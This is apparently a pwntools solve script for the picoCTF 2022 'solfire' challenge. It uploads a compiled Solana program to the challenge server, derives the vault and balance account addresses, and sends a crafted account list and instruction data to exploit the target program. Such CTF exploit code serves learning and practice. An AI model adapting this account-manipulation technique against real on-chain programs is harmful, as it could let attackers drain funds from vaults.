#!/usr/bin/env python3
import re

from pwn import *
from base58 import b58decode, b58encode
from solana.publickey import PublicKey


HOST, PORT = "saturn.picoctf.net 52570".split()
PUBKEYS_NUM = 0x3


def get_solve_content() -> bytes:
    filename = (
        "/home/h4ck1t/Desktop/CTFs/picoCTF2022/solfire/"
        "example-helloworld/dist/program/helloworld.so"
    )
    with open(filename, "rb") as file:
        data = file.read()

    return data


def start() -> object:
    io = remote("localhost", 8080) if not args.REMOTE else remote(HOST, PORT)
    return io


def main() -> None:
    itob = lambda x: str(x).encode()
    io = start()
    data = get_solve_content()

    log.info(f"file len: {len(data)}")
    io.sendlineafter(b"len:", itob(len(data)))
    io.send(data)

    pubkeys = dict()
    for i in range(PUBKEYS_NUM):
        name = io.recvuntil(b"pubkey: ", drop=True).strip().decode()
        pubkeys[name] = (io.recvline().strip().decode())

    for key in pubkeys:
        print(key, pubkeys[key])

    clock_pubkey = b"C1ockAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    system_pubkey = b"11111111111111111111111111111111" # works now!

    _, solfire_bump_seed = PublicKey.find_program_address([], PublicKey(pubkeys["program"]))

    # balances_pubkey, balances_bump_seed = PublicKey.find_program_address([b"A"], PublicKey(pubkeys["program"]))
    balances_pubkey, balances_bump_seed = PublicKey.find_program_address([b"A"], PublicKey(pubkeys["solve"]))
    balances_pubkey = balances_pubkey.to_base58()

    vault_pubkey, vault_bump_seed = PublicKey.find_program_address([b"vault"], PublicKey(pubkeys["program"]))
    vault_pubkey = vault_pubkey.to_base58()

    accts = [
        (b'r', clock_pubkey),
        (b'r', system_pubkey),
        (b'w', balances_pubkey),
        (b'w', vault_pubkey),
        (b'r', pubkeys["program"].encode()),
        (b'r', pubkeys["solve"].encode()),
        (b'ws', pubkeys["user"].encode()),
    ]

    io.sendline(itob(len(accts)))

    for acc in accts:
        io.sendline(b" ".join(acc))

    opcodes = {
        0: "handle_create",
        1: "handle_deposit",
        2: "handle_withdraw",
    }
    ix_data = p8(solfire_bump_seed) + p8(balances_bump_seed) + p8(vault_bump_seed)

    io.sendline(itob(len(ix_data)))
    io.sendline(ix_data)

    io.interactive()

if __name__ == '__main__':
    main()
